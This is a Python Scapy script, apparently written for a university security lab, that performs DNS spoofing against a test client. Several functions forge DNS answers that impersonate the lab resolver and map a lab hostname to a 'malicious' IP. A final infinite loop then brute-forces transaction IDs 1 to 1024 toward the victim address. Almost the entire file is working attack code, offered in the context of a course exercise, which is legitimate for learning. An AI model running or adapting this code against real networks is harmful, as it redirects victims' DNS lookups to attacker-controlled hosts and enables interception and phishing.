from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR

original_sport = 54323

def send_dns(ip, port):
    print(f"dns: {ip}:{port}")
    pkt = IP(dst=ip) / UDP(sport=55312, dport=port) / DNS(rd=1, id=12345,  qd=DNSQR(
        qtype=1, qname="spoofed.lab4.cc5312.xor.cl"))  # qtype=1 is A and DNS Request ID is 12345
    print(f"Sending: {pkt.summary()}")
    # ANS is like  IP(src=ip, dst=<myip>) / UDP(sport=port, dport=54323) / DNS(rd=1, qd=DNSQR(qtype=1, qname="lab4.cc5312.xor.cl") an=[<RRs received>]) # 1 is A
    ans = sr1(pkt, verbose=1)
    print(f"received:")
    ans.show()
    print(ans.command())

def send_dns_answer(numbah):
    spoofed_id = numbah
    malicious_ip = '10.41.0.58'
    destiny_ip = '172.17.69.106'
    RESOLVER_VPN = '172.17.66.9'
    pkt = IP(chksum=None, src=RESOLVER_VPN, dst=destiny_ip)/UDP(sport=53, dport=55312, chksum=None)/DNS(length=None, id=spoofed_id, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=1, arcount=1, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata=malicious_ip), ns=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=2, rclass=1, ttl=1, rdlen=None, rdata=b'ns.cadcc.cl.'), ar=DNSRR(rrname=b'ns.cadcc.cl.', type=1, rclass=1, ttl=9227, rdlen=None, rdata='192.80.24.41'))
    send(pkt)

def create_pkt(number):
    spoofed_id = number
    malicious_ip = '10.41.0.58'
    destiny_ip = '172.17.69.106'
    # RESOLVER_VPN = '172.17.66.9'
    pkt = IP(dst=destiny_ip)/UDP(sport=53, dport=55312)/DNS(id=spoofed_id,qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl', type=1, rclass=1, ttl=100, rdata=malicious_ip))
    return pkt

def send_dns_answer_2(number):
    spoofed_id = number
    malicious_ip = "10.41.0.58"
    destiny_ip = "172.17.69.106"
    RESOLVER_VPN = "172.17.66.9"
    pkt = IP(src=RESOLVER_VPN, dst=destiny_ip)/UDP(sport=53, dport=55312)/DNS(id=spoofed_id, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata=malicious_ip), ns=None, ar=None)
    send(pkt)

def send_dns_answer_3(number):
    client_ip = '172.17.69.106'
    malicious_ip = '10.41.0.58'
    iterable_number = number
    pkt = IP(src='172.17.66.9', dst=client_ip)/UDP(sport=53, dport=55312, len=107, chksum=None)/DNS(id=iterable_number, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=1, arcount=1, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata=malicious_ip), ns=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=2, rclass=1, ttl=1, rdlen=None, rdata=b'ns.cadcc.cl.'), ar=DNSRR(rrname=b'ns.cadcc.cl.', type=1, rclass=1, ttl=10149, rdlen=None, rdata='192.80.24.41'))
    # Sólo envía
    send(pkt)


TEST_IP = "172.17.69.106"

RESOLVER_VPN = "172.17.66.9"
RESOLVER_CLOUD_FARE = '1.1.1.1'

DNS_PORT = 53


send_dns(TEST_IP, DNS_PORT)
#while True:
    #for i in range(0,1025):
        #send_dns_answer(i)

# Answer like
# IP(version=4, ihl=5, tos=0, len=127, id=20261, flags=0, frag=0, ttl=62, proto=17, chksum=13516, src='172.17.66.9', dst='10.41.0.58')/UDP(sport=53, dport=55312, len=107, chksum=48021)/DNS(length=None, id=12345, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, 
# qdcount=1, ancount=1, nscount=1, arcount=1, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata='172.17.69.106'), ns=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=2, 
# rclass=1, ttl=1, rdlen=None, rdata=b'ns.cadcc.cl.'), ar=DNSRR(rrname=b'ns.cadcc.cl.', type=1, rclass=1, ttl=10800, rdlen=None, rdata='192.80.24.41'))

# def create_pkt2(number):
#     malicious_ip = '10.41.0.58'
#     victim_ip = '172.17.69.106'

#     return IP(dst=victim_ip)/UDP(sport=53, dport=55312)/DNS(id=number, rd=1, qr=1, an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', rdata=malicious_ip))


#IP(version=4, ihl=5, tos=0, len=88, id=49228, flags=2, frag=0, ttl=58, proto=17, chksum=33898, src='172.17.69.106', dst='10.41.0.58')/UDP(sport=53, dport=55312, len=68, chksum=13916)/DNS(length=None, id=12345, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata='172.17.69.106'), ns=None, ar=None)

def create_pkt3(number):
    malicious_ip = '10.41.0.58'
    victim_ip = '172.17.69.106'

    return IP(version=4, ihl=5, tos=0, flags=2, frag=0, ttl=58, proto=17, chksum=None, dst=victim_ip)/UDP(sport=53, dport=55312, chksum=None)/DNS(length=None, id=number, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata=malicious_ip), ns=None, ar=None)



while True:
    l = []
    for i in range(1,1025):
        #send(create_pkt3(i))
        l.append(create_pkt3(i).copy())
    send(l)
